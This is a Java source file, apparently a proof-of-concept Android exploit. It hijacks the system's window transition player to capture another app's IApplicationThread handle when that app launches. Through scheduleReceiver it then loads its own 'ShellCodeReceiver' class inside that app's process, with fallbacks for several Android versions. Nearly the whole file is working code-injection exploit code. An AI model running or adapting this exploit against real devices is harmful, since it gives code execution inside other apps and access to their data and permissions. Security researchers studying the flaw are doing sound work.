package top.canyie.transitionplayer;

import android.annotation.SuppressLint;
import android.app.IApplicationThread;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.os.IBinder;
import android.view.SurfaceControl;
import android.window.ITransitionPlayer;
import android.window.RemoteTransition;
import android.window.TransitionInfo;
import android.window.TransitionRequestInfo;
import android.window.WindowOrganizer;

import java.lang.reflect.Field;
import java.util.concurrent.CountDownLatch;

public class Main {
    public static void main(String... args) {
        String apk = getDexLocation(Main.class);
        // Load entire apk file, not a dex file inside it
        int exclamation = apk.indexOf("!");
        if (exclamation != -1)
            apk = apk.substring(0, exclamation);

        ApplicationInfo appInfo = new ApplicationInfo();
        appInfo.packageName = "top.canyie.transitionplayer";
        appInfo.sourceDir = apk;
        appInfo.nativeLibraryDir = ".";
        appInfo.dataDir = ".";
        appInfo.flags = ApplicationInfo.FLAG_HAS_CODE;
        ActivityInfo activityInfo = new ActivityInfo();
        activityInfo.applicationInfo = appInfo;
        activityInfo.name = "top.canyie.transitionplayer.ShellCodeReceiver";
        Intent intent = new Intent().setClassName(appInfo.packageName, activityInfo.name);

        CountDownLatch countDownLatch = new CountDownLatch(1);
        ITransitionPlayer transitionPlayer = new ITransitionPlayer.Stub() {
            @Override public void onTransitionReady(IBinder transitionToken, TransitionInfo info, SurfaceControl.Transaction t, SurfaceControl.Transaction finishT) {
                System.out.println("- onTransitionReady " + info);
            }

            @Override public void requestStartTransition(IBinder transitionToken, TransitionRequestInfo request) {
                System.out.println("- requestStartTransition " + request);
                try {
                    RemoteTransition remoteTransition = request.getRemoteTransition();
                    if (remoteTransition == null) return;
                    IApplicationThread appThread = remoteTransition.getAppThread();
                    System.out.println("- Received IApplicationThread handle " + appThread);
                    if (appThread == null) return;
                    try {
                        appThread.scheduleReceiver(intent, activityInfo, null, 0, null, null, false, false, 0, 0, 1000, "android");
                    } catch (NoSuchMethodError e) {
                        try {
                            appThread.scheduleReceiver(intent, activityInfo, null, 0, null, null, false, false, 0, 0);
                        } catch (NoSuchMethodError e2) {
                            appThread.scheduleReceiver(intent, activityInfo, null, 0, null, null, false, 0, 0);
                        }
                    }
                } catch (Throwable e) {
                    e.printStackTrace();
                }
                countDownLatch.countDown();
            }
        };
        WindowOrganizer windowOrganizer = new WindowOrganizer();
        windowOrganizer.registerTransitionPlayer(transitionPlayer);
        System.out.println("- Registered transaction player, now start an app from launcher");
        try {
            countDownLatch.await();
        } catch (InterruptedException e) {
            System.out.println("! Interrupted, exiting");
        } finally {
            System.out.println("- Unregistered transaction player");
            windowOrganizer.unregisterTransitionPlayer(transitionPlayer);
        }
    }

    @SuppressLint({"DiscouragedPrivateApi", "BlockedPrivateApi"})
    public static String getDexLocation(Class<?> cls) {
        try {
            Class<?> DexCache = Class.forName("java.lang.DexCache");
            Field dexCache = Class.class.getDeclaredField("dexCache");
            dexCache.setAccessible(true);
            Object cache = dexCache.get(cls);
            if (cache == null) return null;
            Field location = DexCache.getDeclaredField("location");
            location.setAccessible(true);
            return (String) location.get(cache);
        } catch (ReflectiveOperationException e) {
            throw new RuntimeException(e);
        }
    }
}
